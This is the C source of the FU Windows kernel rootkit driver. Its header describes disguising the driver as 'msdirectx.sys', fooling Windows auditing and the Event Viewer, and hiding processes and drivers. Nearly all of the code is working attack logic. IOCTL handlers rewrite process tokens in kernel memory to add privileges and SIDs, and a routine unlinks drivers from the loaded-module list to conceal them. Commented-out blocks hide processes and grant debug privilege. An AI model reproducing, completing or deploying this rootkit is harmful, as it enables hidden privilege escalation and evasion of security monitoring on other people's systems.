///////////////////////////////////////////////////////////////////////////////////////
// Filename Rootkit.c
// 
// Author: fuzen_op
// Email:  fuzen_op@yahoo.com or fuzen_op@rootkit.com
//
// Description: This driver does all the work of fu.exe. The driver is never unloaded 
//              until reboot. You can use whatever methods you like to load the driver 
//				such as SystemLoadAndCallImage suggested by Greg Hoglund. The driver 
//              is named msdirectx.sys. It is a play on Microsoft's DirectX and is named
//              this to help hide it. (A future tool will hide it completely!) The 
//              driver can change the groups and privileges on any process. It can also 
//              hide a process. Another feature is it can impersonate another logon 
//              session so that Windows Auditing etc. does not know what user really 
//              performed the actions you choose to take with the process. It does all 
//              this by Direct Kernel Object Manipulation (TM). No worries about do I have 
//              permission to that process, token, etc. If you can load a driver once, 
//              you are golden! NOW IT HIDES DRIVERS TOO!
//
// Date:    5/27/2003
// Version: 2.0
//
// Date     7/04/2003   Fixed a problem with a modified token not being inheritable.
//		   12/04/2003   Fixed problem with faking out the Windows Event Viewer.	
//						Cleaned up the code a lot! 
//		   12/05/2003   Now the driver walks the PsLoadedModuleList and removes references 
//                      to the device being hidden. Even after the device is hidden, a user 
//						land process can open a handle to it if its symbolic link name still 
//						exists. Obviously, a stealth driver would not want to create a or it 
//						could delete the symbolic link once it has initialized through the use
//						of an IOCTL.	

#include "fu_rootkit.h"
#include "ioctlcmd.h"


const WCHAR deviceLinkBuffer[] = L"\\DosDevices\\msdirectx";
const WCHAR deviceNameBuffer[] = L"\\Device\\msdirectx";


//#define DEGUBPRINT
//#ifdef DEBUGPRINT
#define   DebugPrint		DbgPrint
//#else
//	#define   DebugPrint
//#endif

NTSTATUS FU_Onload(
	IN PDRIVER_OBJECT  DriverObject,
	IN PUNICODE_STRING RegistryPath
	)
{

	NTSTATUS                ntStatus;
	UNICODE_STRING          deviceNameUnicodeString;
	UNICODE_STRING          deviceLinkUnicodeString;


	// Setup our name and symbolic link. 
	RtlInitUnicodeString(&deviceNameUnicodeString,
		deviceNameBuffer);
	RtlInitUnicodeString(&deviceLinkUnicodeString,
		deviceLinkBuffer);
	// Set up the device
	//
	ntStatus = IoCreateDevice(DriverObject,
		0, // For driver extension
		&deviceNameUnicodeString,
		FILE_DEVICE_ROOTKIT,
		0,
		TRUE,
		&g_RootkitDevice);

	if (!NT_SUCCESS(ntStatus))
	{
		DebugPrint(("Failed to create device!\n"));
		return ntStatus;
	}


	ntStatus = IoCreateSymbolicLink(&deviceLinkUnicodeString,
		&deviceNameUnicodeString);
	if (!NT_SUCCESS(ntStatus))
	{
		IoDeleteDevice(DriverObject->DeviceObject);
		DebugPrint("Failed to create symbolic link!\n");
		return ntStatus;
	}


	// Create dispatch points for all routines that must be handled
	DriverObject->MajorFunction[IRP_MJ_SHUTDOWN] =
		DriverObject->MajorFunction[IRP_MJ_CREATE] =
		DriverObject->MajorFunction[IRP_MJ_CLOSE] =
		DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = RootkitDispatch;

	// Its extremely unsafe to unload a system-call hooker.
	// Use GREAT caution.
	//DriverObject->DriverUnload = FU_OnUnload;


	// Get the offset of the process name in the EPROCESS structure.
	gul_ProcessNameOffset = GetLocationOfProcessName(PsGetCurrentProcess());
	if (!gul_ProcessNameOffset)
	{
		IoDeleteSymbolicLink(&deviceLinkUnicodeString);
		 //Delete the device object
		IoDeleteDevice(DriverObject->DeviceObject);
		return STATUS_UNSUCCESSFUL;
	}

	gul_PsLoadedModuleList = (PMODULE_ENTRY)FindPsLoadedModuleList(DriverObject);
	if (!gul_PsLoadedModuleList)
	{
		IoDeleteSymbolicLink(&deviceLinkUnicodeString);
		 //Delete the device object
		IoDeleteDevice(DriverObject->DeviceObject);
		return STATUS_UNSUCCESSFUL;
	}

	//ULONG64 taskhost = FindProcessEPROCByName("taskhost");
	//if (taskhost == 0) {
	//	IoDeleteSymbolicLink(&deviceLinkUnicodeString);
	//	//Delete the device object
	//	IoDeleteDevice(DriverObject->DeviceObject);
	//	return STATUS_UNSUCCESSFUL;
	//}

	//ULONG64 token = (*(PULONG64)((PUCHAR)taskhost + 0x208)) & 0xFFFFFFFFFFFFFFF0;
	//PULONG64 privs = (PULONG64)((PUCHAR)token + 0x040);
	//PULONG64 privs_enable = (PULONG64)((PUCHAR)token + 0x048);
	//*privs |= 1 << SE_DEBUG_PRIVILEGE;
	//*privs_enable |= 1 << SE_DEBUG_PRIVILEGE;


	return STATUS_SUCCESS;
}


VOID FU_OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING          deviceLinkUnicodeString;
	PDEVICE_OBJECT			p_NextObj;

	p_NextObj = DriverObject->DeviceObject;

	if (p_NextObj != NULL)
	{
		// Delete the symbolic link for our device
		//
		RtlInitUnicodeString(&deviceLinkUnicodeString, deviceLinkBuffer);
		IoDeleteSymbolicLink(&deviceLinkUnicodeString);
		// Delete the device object
		//
		IoDeleteDevice(DriverObject->DeviceObject);
		//return STATUS_SUCCESS;
	}
	//return STATUS_SUCCESS;
}



NTSTATUS
RootkitDispatch(
IN PDEVICE_OBJECT DeviceObject,
IN PIRP Irp
)
{
	PIO_STACK_LOCATION      irpStack;
	PVOID                   inputBuffer;
	PVOID                   outputBuffer;
	ULONG                   inputBufferLength;
	ULONG                   outputBufferLength;
	ULONG                   ioControlCode;
	NTSTATUS				ntstatus;

	//
	// Go ahead and set the request up as successful
	//
	ntstatus = Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	//
	// Get a pointer to the current location in the Irp. This is where
	//     the function codes and parameters are located.
	//
	irpStack = IoGetCurrentIrpStackLocation(Irp);

	//
	// Get the pointer to the input/output buffer and its length
	//
	inputBuffer = Irp->AssociatedIrp.SystemBuffer;
	inputBufferLength = irpStack->Parameters.DeviceIoControl.InputBufferLength;
	outputBuffer = Irp->AssociatedIrp.SystemBuffer;
	outputBufferLength = irpStack->Parameters.DeviceIoControl.OutputBufferLength;
	ioControlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;

	switch (irpStack->MajorFunction) {
	case IRP_MJ_CREATE:
		break;

	case IRP_MJ_SHUTDOWN:
		break;

	case IRP_MJ_CLOSE:
		break;

	case IRP_MJ_DEVICE_CONTROL:

		if (IOCTL_TRANSFER_TYPE(ioControlCode) == METHOD_NEITHER) {
			outputBuffer = Irp->UserBuffer;
		}

		// Its a request from rootkit 
		ntstatus = RootkitDeviceControl(irpStack->FileObject, TRUE,
			inputBuffer, inputBufferLength,
			outputBuffer, outputBufferLength,
			ioControlCode, &Irp->IoStatus, DeviceObject);
		break;
	}
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return ntstatus;
}


NTSTATUS
RootkitDeviceControl(
IN PFILE_OBJECT FileObject,
IN BOOLEAN Wait,
IN PVOID InputBuffer,
IN ULONG InputBufferLength,
OUT PVOID OutputBuffer,
IN ULONG OutputBufferLength,
IN ULONG IoControlCode,
OUT PIO_STATUS_BLOCK IoStatus,
IN PDEVICE_OBJECT DeviceObject
)
{
	NTSTATUS ntStatus;
	UNICODE_STRING          deviceLinkUnicodeString;
	MODULE_ENTRY m_current;
	PMODULE_ENTRY pm_current;
	ANSI_STRING ansi_DriverName;
	ANSI_STRING hide_DriverName;
	UNICODE_STRING uni_hide_DriverName;
	int	i_count = 0, i_numLogs = 0, find_PID = 0;
	int nluids = 0, i_PrivCount = 0, i_VariableLen = 0;
	int i_LuidsUsed = 0, luid_attr_count = 0, i_SidCount = 0;
	int i_SidSize = 0, i_spaceNeeded = 0, i_spaceSaved = 0;
	int i_spaceUsed = 0, sid_count = 0;
	ULONG64 eproc = 0;
	ULONG64 start_eproc = 0;
	ULONG64 token = 0;
	PLIST_ENTRY          plist_active_procs = NULL;
	PLUID_AND_ATTRIBUTES luids_attr = NULL;
	PLUID_AND_ATTRIBUTES luids_attr_orig = NULL;
	PSID_AND_ATTRIBUTES  sid_ptr_old = NULL;

	void *varpart = NULL, *varbegin = NULL, *psid = NULL;

	DWORD SizeOfOldSids, SizeOfLastSid, d_SidStart;

	IoStatus->Status = STATUS_SUCCESS;
	IoStatus->Information = 0;

	switch (IoControlCode)
	{

	case IOCTL_ROOTKIT_INIT:
		if ((InputBufferLength < sizeof(int)* 8) || (InputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		/*PIDOFFSET = (int)(*(int *)InputBuffer);
		FLINKOFFSET = (int)(*((int *)InputBuffer + 1));
		AUTHIDOFFSET = (int)(*((int *)InputBuffer + 2));
		TOKENOFFSET = (int)(*((int *)InputBuffer + 3));
		PRIVCOUNTOFFSET = (int)(*((int *)InputBuffer + 4));
		PRIVADDROFFSET = (int)(*((int *)InputBuffer + 5));
		SIDCOUNTOFFSET = (int)(*((int *)InputBuffer + 6));
		SIDADDROFFSET = (int)(*((int *)InputBuffer + 7));*/

		break;

	/*case IOCTL_ROOTKIT_HIDEME:
		if ((InputBufferLength < sizeof(DWORD)) || (InputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		find_PID = *((DWORD *)InputBuffer);
		if (find_PID == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}

		eproc = FindProcessEPROC(find_PID);
		if (eproc == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}

		plist_active_procs = (LIST_ENTRY *)(eproc + FLINKOFFSET);
		*((DWORD *)plist_active_procs->Blink) = (DWORD)plist_active_procs->Flink;
		*((DWORD *)plist_active_procs->Flink + 1) = (DWORD)plist_active_procs->Blink;

		break;*/

	/*case IOCTL_ROOTKIT_LISTPROC:
		if ((OutputBufferLength < PROCNAMEIDLEN) || (OutputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		i_numLogs = OutputBufferLength / PROCNAMEIDLEN;
		if (i_numLogs < 1)
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		find_PID = (DWORD)PsGetCurrentProcessId();
		eproc = FindProcessEPROC(find_PID);

		if (eproc == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}

		start_eproc = eproc;
		RtlZeroMemory(OutputBuffer, OutputBufferLength);

		for (i_count = 1; i_count <= i_numLogs; i_count++)
		{
			_snprintf((char *)((DWORD)OutputBuffer + ((i_count - 1) * PROCNAMEIDLEN)), PROCNAMEIDLEN - 1, "%s:%u", (char *)eproc + gul_ProcessNameOffset, *(DWORD *)(eproc + PIDOFFSET));
			IoStatus->Information = (i_count)* PROCNAMEIDLEN;
			plist_active_procs = (LIST_ENTRY *)(eproc + FLINKOFFSET);
			eproc = (DWORD)plist_active_procs->Flink;
			eproc = eproc - FLINKOFFSET;
			if (start_eproc == eproc)
			{
				break;
			}
		}

		IoStatus->Status = STATUS_SUCCESS;

		break;*/

	case IOCTL_ROOTKIT_SETPRIV:
		if ((InputBufferLength < sizeof(struct _vars)) || (InputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		////////////////////////////////////////////////////////////////////////////////////////
		// Some of these are pointers so what they point to may not be paged in, but I don't care. It is 
		// proof of concept code for a reason.
		find_PID = ((VARS *)InputBuffer)->the_PID;
		luids_attr = ((VARS *)InputBuffer)->pluida;
		nluids = ((VARS *)InputBuffer)->num_luids;

		if ((find_PID == 0x00000000) || (luids_attr == NULL) || (nluids == 0))
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}

		eproc = FindProcessEPROC(find_PID);
		if (eproc == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}

		token = FindProcessToken(eproc);

		i_PrivCount = *(PDWORD)(token + PRIVCOUNTOFFSET);
		luids_attr_orig = *(PLUID_AND_ATTRIBUTES *)(token + PRIVADDROFFSET);
		//FindTokenParams(token, &i_PrivCount, (PDWORD)&luids_attr_orig);

		// If the new privilege already exists in the token, just change its Attribute field.
		for (luid_attr_count = 0; luid_attr_count < i_PrivCount; luid_attr_count++)
		{
			for (i_LuidsUsed = 0; i_LuidsUsed < nluids; i_LuidsUsed++)
			{
				if ((luids_attr[i_LuidsUsed].Attributes != 0xffffffff) && (memcmp(&luids_attr_orig[luid_attr_count].Luid, &luids_attr[i_LuidsUsed].Luid, sizeof(LUID)) == 0))
				{
					luids_attr_orig[luid_attr_count].Attributes = luids_attr[i_LuidsUsed].Attributes;
					luids_attr[i_LuidsUsed].Attributes = 0xffffffff; // Canary value we will use
				}
			}
		}

		// OK, we did not find one of the new Privileges in the set of existing privileges so we are going to find the
		// disabled privileges and overwrite them.
		for (i_LuidsUsed = 0; i_LuidsUsed < nluids; i_LuidsUsed++)
		{
			if (luids_attr[i_LuidsUsed].Attributes != 0xffffffff)
			{
				for (luid_attr_count = 0; luid_attr_count < i_PrivCount; luid_attr_count++)
				{
					// If the privilege was disabled anyway, it was not necessary and we are going to reuse this space for our 
					// new privileges we want to add. Not all the privileges we request may get added because of space so you
					// should order the new privileges in decreasing order.
					if ((luids_attr[i_LuidsUsed].Attributes != 0xffffffff) && (luids_attr_orig[luid_attr_count].Attributes == 0x00000000))
					{
						luids_attr_orig[luid_attr_count].Luid = luids_attr[i_LuidsUsed].Luid;
						luids_attr_orig[luid_attr_count].Attributes = luids_attr[i_LuidsUsed].Attributes;
						luids_attr[i_LuidsUsed].Attributes = 0xffffffff; // Canary value we will use
					}
				}
			}
		}

		break;

	case IOCTL_ROOTKIT_SETSID:
		if ((InputBufferLength < sizeof(struct _vars2)) || (InputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		////////////////////////////////////////////////////////////////////////////////////////
		// Some of these are pointers so what they point to may not be paged in, but I don't care. It is 
		// proof of concept code for a reason.
		find_PID = ((VARS2 *)InputBuffer)->the_PID;
		psid = ((VARS2 *)InputBuffer)->pSID;
		i_SidSize = ((VARS2 *)InputBuffer)->i_SidSize;

		if ((find_PID == 0x00000000) || (psid == NULL) || (i_SidSize == 0))
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}

		eproc = FindProcessEPROC(find_PID);
		if (eproc == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}

		token = FindProcessToken(eproc);
		i_PrivCount = *(int *)(token + PRIVCOUNTOFFSET);
		i_SidCount = *(int *)(token + SIDCOUNTOFFSET);
		luids_attr_orig = *(PLUID_AND_ATTRIBUTES *)(token + PRIVADDROFFSET);
		varbegin = (PVOID)luids_attr_orig;
		i_VariableLen = *(int *)(token + PRIVCOUNTOFFSET + 4);
		sid_ptr_old = *(PSID_AND_ATTRIBUTES *)(token + SIDADDROFFSET);

		// This is going to be our temporary workspace
		varpart = ExAllocatePool(PagedPool, i_VariableLen);
		if (varpart == NULL)
		{
			IoStatus->Status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}
		RtlZeroMemory(varpart, i_VariableLen);

		// Copy only the Privileges enabled. We will overwrite the disabled privileges to make room for the new SID
		for (luid_attr_count = 0; luid_attr_count < i_PrivCount; luid_attr_count++)
		{
			if (((PLUID_AND_ATTRIBUTES)varbegin)[luid_attr_count].Attributes != SE_PRIVILEGE_DISABLED)
			{
				((PLUID_AND_ATTRIBUTES)varpart)[i_LuidsUsed].Luid = ((PLUID_AND_ATTRIBUTES)varbegin)[luid_attr_count].Luid;
				((PLUID_AND_ATTRIBUTES)varpart)[i_LuidsUsed].Attributes = ((PLUID_AND_ATTRIBUTES)varbegin)[luid_attr_count].Attributes;
				i_LuidsUsed++;
			}
		}

		// Calculate the space that we need within the existing token
		i_spaceNeeded = i_SidSize + sizeof(SID_AND_ATTRIBUTES);
		i_spaceSaved = (i_PrivCount - i_LuidsUsed) * sizeof(LUID_AND_ATTRIBUTES);
		i_spaceUsed = i_LuidsUsed * sizeof(LUID_AND_ATTRIBUTES);

		// There is not enough room for the new SID. Note: I am ignoring the Restricted SID's. They may also
		// be a part of the variable length part.
		if (i_spaceSaved  < i_spaceNeeded)
		{
			ExFreePool(varpart);
			IoStatus->Status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		RtlCopyMemory((PVOID)((DWORD)varpart + i_spaceUsed), (PVOID)((DWORD)varbegin + (i_PrivCount * sizeof(LUID_AND_ATTRIBUTES))), i_SidCount * sizeof(SID_AND_ATTRIBUTES));

		for (sid_count = 0; sid_count < i_SidCount; sid_count++)
		{
			//((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[sid_count].Sid =  (PSID)((DWORD) sid_ptr_old[sid_count].Sid - ((i_PrivCount * sizeof(LUID_AND_ATTRIBUTES)) - (i_LuidsUsed * sizeof(LUID_AND_ATTRIBUTES))) + sizeof(SID_AND_ATTRIBUTES));
			((PSID_AND_ATTRIBUTES)((DWORD)varpart + (i_spaceUsed)))[sid_count].Sid = (PSID)(((DWORD)sid_ptr_old[sid_count].Sid) - ((DWORD)i_spaceSaved) + ((DWORD)sizeof(SID_AND_ATTRIBUTES)));
			((PSID_AND_ATTRIBUTES)((DWORD)varpart + (i_spaceUsed)))[sid_count].Attributes = sid_ptr_old[sid_count].Attributes;
		}

		// Setup the new SID_AND_ATTRIBUTES properly.
		SizeOfLastSid = (DWORD)varbegin + i_VariableLen;
		SizeOfLastSid = SizeOfLastSid - (DWORD)((PSID_AND_ATTRIBUTES)sid_ptr_old)[i_SidCount - 1].Sid;
		((PSID_AND_ATTRIBUTES)((DWORD)varpart + (i_spaceUsed)))[i_SidCount].Sid = (PSID)((DWORD)((PSID_AND_ATTRIBUTES)((DWORD)varpart + (i_spaceUsed)))[i_SidCount - 1].Sid + SizeOfLastSid);
		((PSID_AND_ATTRIBUTES)((DWORD)varpart + (i_spaceUsed)))[i_SidCount].Attributes = 0x00000007;

		// Copy the old SID's, but make room for the new SID_AND_ATTRIBUTES
		SizeOfOldSids = (DWORD)varbegin + i_VariableLen;
		SizeOfOldSids = SizeOfOldSids - (DWORD)((PSID_AND_ATTRIBUTES)sid_ptr_old)[0].Sid;
		RtlCopyMemory((VOID UNALIGNED *)((DWORD)varpart + (i_spaceUsed)+((i_SidCount + 1)*sizeof(SID_AND_ATTRIBUTES))), (CONST VOID UNALIGNED *)((DWORD)varbegin + (i_PrivCount*sizeof(LUID_AND_ATTRIBUTES)) + (i_SidCount*sizeof(SID_AND_ATTRIBUTES))), SizeOfOldSids);

		// Copy the new stuff right over the old data
		RtlZeroMemory(varbegin, i_VariableLen);
		RtlCopyMemory(varbegin, varpart, i_VariableLen);

		// Copy the new SID at the end of the old SID's.
		RtlCopyMemory(((PSID_AND_ATTRIBUTES)((DWORD)varbegin + (i_spaceUsed)))[i_SidCount].Sid, psid, i_SidSize);

		// Fix the token back up.
		*(int *)(token + SIDCOUNTOFFSET) += 1;
		*(int *)(token + PRIVCOUNTOFFSET) = i_LuidsUsed;
		*(PSID_AND_ATTRIBUTES *)(token + SIDADDROFFSET) = (PSID_AND_ATTRIBUTES)((DWORD)varbegin + (i_spaceUsed));

		ExFreePool(varpart);
		break;

	case IOCTL_ROOTKIT_SETAUTHID:
		if ((InputBufferLength < sizeof(struct _vars2)) || (InputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		////////////////////////////////////////////////////////////////////////////////////////
		// Some of these are pointers so what they point to may not be paged in, but I don't care. It is 
		// proof of concept code for a reason.
		find_PID = ((VARS2 *)InputBuffer)->the_PID;
		psid = ((VARS2 *)InputBuffer)->pSID;
		i_SidSize = ((VARS2 *)InputBuffer)->i_SidSize;

		if ((find_PID == 0x00000000) || (psid == NULL) || (i_SidSize == 0))
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}

		eproc = FindProcessEPROC(find_PID);
		if (eproc == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}

		token = FindProcessToken(eproc);
		i_PrivCount = *(int *)(token + PRIVCOUNTOFFSET);
		i_SidCount = *(int *)(token + SIDCOUNTOFFSET);
		luids_attr_orig = *(PLUID_AND_ATTRIBUTES *)(token + PRIVADDROFFSET);
		varbegin = (PVOID)luids_attr_orig;
		i_VariableLen = *(int *)(token + PRIVCOUNTOFFSET + 4);
		sid_ptr_old = *(PSID_AND_ATTRIBUTES *)(token + SIDADDROFFSET);

		// This is going to be our temporary workspace
		varpart = ExAllocatePool(PagedPool, i_VariableLen);
		if (varpart == NULL)
		{
			IoStatus->Status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		RtlZeroMemory(varpart, i_VariableLen);

		// Copy only the Privileges enabled. We will overwrite the disabled privileges to make room for the new SID
		for (luid_attr_count = 0; luid_attr_count < i_PrivCount; luid_attr_count++)
		{
			if (((PLUID_AND_ATTRIBUTES)varbegin)[luid_attr_count].Attributes != SE_PRIVILEGE_DISABLED)
			{
				((PLUID_AND_ATTRIBUTES)varpart)[i_LuidsUsed].Luid = ((PLUID_AND_ATTRIBUTES)varbegin)[luid_attr_count].Luid;
				((PLUID_AND_ATTRIBUTES)varpart)[i_LuidsUsed].Attributes = ((PLUID_AND_ATTRIBUTES)varbegin)[luid_attr_count].Attributes;
				i_LuidsUsed++;
			}
		}

		// Calculate the space that we need within the existing token
		i_spaceNeeded = i_SidSize + sizeof(SID_AND_ATTRIBUTES);
		i_spaceSaved = (i_PrivCount - i_LuidsUsed) * sizeof(LUID_AND_ATTRIBUTES);
		i_spaceUsed = i_LuidsUsed * sizeof(LUID_AND_ATTRIBUTES);

		// There is not enough room for the new SID. Note: I am ignoring the Restricted SID's. They may also
		// be a part of the variable length part.
		if (i_spaceSaved  < i_spaceNeeded)
		{
			ExFreePool(varpart);
			IoStatus->Status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		((PSID_AND_ATTRIBUTES)((DWORD)varpart + (i_spaceUsed)))[0].Sid = (PSID)((DWORD)varbegin + (i_spaceUsed)+((i_SidCount + 1) * sizeof(SID_AND_ATTRIBUTES)));
		((PSID_AND_ATTRIBUTES)((DWORD)varpart + (i_spaceUsed)))[0].Attributes = 0x00000000;

		d_SidStart = ((DWORD)varbegin + (i_spaceUsed)+((i_SidCount + 1) * sizeof(SID_AND_ATTRIBUTES)));
		for (sid_count = 0; sid_count < i_SidCount; sid_count++)
		{
			if (sid_count == 0)
			{
				((PSID_AND_ATTRIBUTES)((DWORD)varpart + (i_spaceUsed)))[sid_count + 1].Sid = (PSID)(d_SidStart + i_SidSize);
				((PSID_AND_ATTRIBUTES)((DWORD)varpart + (i_spaceUsed)))[sid_count + 1].Attributes = 0x00000007;
			}
			else {
				((PSID_AND_ATTRIBUTES)((DWORD)varpart + (i_spaceUsed)))[sid_count + 1].Sid = (PSID)((DWORD)sid_ptr_old[sid_count].Sid - (DWORD)sid_ptr_old[sid_count - 1].Sid + (DWORD)((PSID_AND_ATTRIBUTES)((DWORD)varpart + (i_spaceUsed)))[sid_count].Sid);
				((PSID_AND_ATTRIBUTES)((DWORD)varpart + (i_spaceUsed)))[sid_count + 1].Attributes = sid_ptr_old[sid_count].Attributes;
			}
		}
		// Copy the new SID.
		RtlCopyMemory((PVOID)((DWORD)varpart + (i_spaceUsed)+((i_SidCount + 1) * sizeof(SID_AND_ATTRIBUTES))), psid, i_SidSize);

		// Copy the old SID's, but make room for the new SID_AND_ATTRIBUTES
		SizeOfOldSids = (DWORD)varbegin + i_VariableLen;
		SizeOfOldSids = SizeOfOldSids - (DWORD)((PSID_AND_ATTRIBUTES)sid_ptr_old)[0].Sid;
		DbgPrint("The SizeOfOldSids = %x\n", SizeOfOldSids);
		RtlCopyMemory((VOID UNALIGNED *)((DWORD)varpart + (i_spaceUsed)+(i_SidCount*sizeof(SID_AND_ATTRIBUTES)) + i_spaceNeeded), (CONST VOID UNALIGNED *)((DWORD)varbegin + (i_PrivCount*sizeof(LUID_AND_ATTRIBUTES)) + (i_SidCount*sizeof(SID_AND_ATTRIBUTES))), SizeOfOldSids);

		// Copy the new stuff right over the old data
		RtlZeroMemory(varbegin, i_VariableLen);
		RtlCopyMemory(varbegin, varpart, i_VariableLen);

		// Fix the token back up.
		*(int *)(token + SIDCOUNTOFFSET) += 1;
		*(int *)(token + PRIVCOUNTOFFSET) = i_LuidsUsed;
		*(PSID_AND_ATTRIBUTES *)(token + SIDADDROFFSET) = (PSID_AND_ATTRIBUTES)((DWORD)varbegin + (i_spaceUsed));

		// Set the AUTH_ID in the token to the LUID for the System account.
		//*(int *)(token + AUTHIDOFFSET) = SYSTEM_LUID;

		ExFreePool(varpart);

		break;

		// This only prints the driver names to the debugger such as Debug View from SysInternals
	case IOCTL_ROOTKIT_LISTDRIV:
		if (gul_PsLoadedModuleList == NULL)
		{
			IoStatus->Status = STATUS_UNSUCCESSFUL;
			break;
		}

		pm_current = gul_PsLoadedModuleList;

		while ((PMODULE_ENTRY)pm_current->inLoadOrderLinks.Flink != gul_PsLoadedModuleList)
		{
			//DbgPrint("Module at 0x%x unk1 0x%x path.length 0x%x name.length 0x%x\n", pm_current, pm_current->unk1, pm_current->driver_Path.Length, pm_current->driver_Name.Length);
			// This works on Windows XP SP1 and Windows 2003.
			if ((pm_current->sizeOfImage != 0x00000000) && (pm_current->fullDllName.Length != 0))
			{
				DbgPrint("Driver: %ws\n", pm_current->baseDllName.Buffer);
			}
			pm_current = (MODULE_ENTRY*)pm_current->inLoadOrderLinks.Flink;
		}

		break;

	case IOCTL_ROOTKIT_HIDEDRIV:
		// Do some verification on the input buffer.
		if ((InputBufferLength < sizeof(char)) || (InputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		if (gul_PsLoadedModuleList == NULL)
		{
			IoStatus->Status = STATUS_UNSUCCESSFUL;
			break;
		}

		hide_DriverName.Length = (USHORT)InputBufferLength;
		hide_DriverName.MaximumLength = (USHORT)InputBufferLength;
		hide_DriverName.Buffer = (PCHAR)InputBuffer;

		ntStatus = RtlAnsiStringToUnicodeString(&uni_hide_DriverName, &hide_DriverName, TRUE);
		if (!NT_SUCCESS(ntStatus)) {
			IoStatus->Status = STATUS_UNSUCCESSFUL;
			break;
		}

		pm_current = gul_PsLoadedModuleList;

		while ((PMODULE_ENTRY)pm_current->inLoadOrderLinks.Flink != gul_PsLoadedModuleList)
		{
			//DbgPrint("Module at 0x%x unk1 0x%x path.length 0x%x name.length 0x%x\n", pm_current, pm_current->unk1, pm_current->driver_Path.Length, pm_current->driver_Name.Length);
			// This works on Windows XP SP1 and Windows 2003.
			if ((pm_current->sizeOfImage != 0x00000000) && (pm_current->fullDllName.Length != 0))
			{
				if (RtlCompareUnicodeString(&uni_hide_DriverName, &(pm_current->baseDllName), FALSE) == 0)
				{
					*((PULONG64)pm_current->inLoadOrderLinks.Blink) = (ULONG64)pm_current->inLoadOrderLinks.Flink;
					pm_current->inLoadOrderLinks.Flink->Blink = pm_current->inLoadOrderLinks.Blink;
					//DbgPrint("Just hid %s\n",hide_DriverName.Buffer);
					break;
				}
				/*				if (RtlCompareUnicodeString(&uni_hide_DriverName, &(m_current.driver_Name), FALSE) == 0)
				{
				*((PDWORD)m_current.le_mod.Blink)        = (DWORD) m_current.le_mod.Flink;
				m_current.le_mod.Flink->Blink            = m_current.le_mod.Blink;
				//DbgPrint("Just hid %s\n",hide_DriverName.Buffer);
				break;
				}
				*/
			}
			pm_current = (MODULE_ENTRY*)pm_current->inLoadOrderLinks.Flink;
		}

		if (NT_SUCCESS(ntStatus)) {
			RtlFreeUnicodeString(&uni_hide_DriverName);
		}

		break;

	default:
		IoStatus->Status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	return IoStatus->Status;
}


//////////////////////////////////////////////////////////////////////////////
// Finds and returns the address of the PsLoadedModuleList. This is based on
// the information provided by Edgar Barbosa in his paper "Finding some
// non-exported kernel variables in Windows XP". Works with Windows XP and
// Windows 2003.
//DWORD Non2000FindPsLoadedModuleList(void)
//{
//	DWORD address = 0x00000000;
//
//	__asm {
//		mov eax, fs:[0x34]; // Get address of KdVersionBlock
//		mov eax, [eax + 0x70]; // Get address of PsLoadedModuleList
//		mov address, eax;
//	}
//
//	return address;
//}


ULONG64 FindPsLoadedModuleList(IN PDRIVER_OBJECT  DriverObject)
{
	PMODULE_ENTRY pm_current;

	if (DriverObject == NULL)
		return 0;

	pm_current = *((PMODULE_ENTRY*)((PUCHAR)DriverObject + 0x28));
	if (pm_current == NULL)
		return 0;

	return (ULONG64)pm_current;
	/*	gul_PsLoadedModuleList = pm_current;
	while ((PMODULE_ENTRY)pm_current->le_mod.Flink != gul_PsLoadedModuleList)
	{
	//DbgPrint("Module at 0x%x unk1 0x%x path.length 0x%x name.length 0x%x\n", pm_current, pm_current->unk1, pm_current->driver_Path.Length, pm_current->driver_Name.Length);
	// This works on Windows XP SP1 and Windows 2003.
	if ((pm_current->unk1 == 0x00000000) && (pm_current->driver_Path.Length == 0))
	{
	return (DWORD) pm_current;
	}
	pm_current =  (MODULE_ENTRY*)pm_current->le_mod.Flink;
	}

	return 0;
	*/
}


ULONG64 FindProcessToken(ULONG64 eproc)
{
	//DWORD token;

	//__asm {
	//	mov eax, eproc;
	//	add eax, TOKENOFFSET;
	//	mov eax, [eax];
	//	and eax, 0xfffffff8; // Added for XP. See definition of _EX_FAST_REF
	//	mov token, eax;
	//}

	//return token;
	return (*(PULONG64)((PUCHAR)eproc + TOKENOFFSET)) & 0xFFFFFFFFFFFFFFF0;
	//return (ULONG64)((PUCHAR)eproc + TOKENOFFSET);
}



//////////////////////////////////////////////////////////////////////////////
// This function was originally written mostly in assembly language. Now let's
// make it readable to the masses.
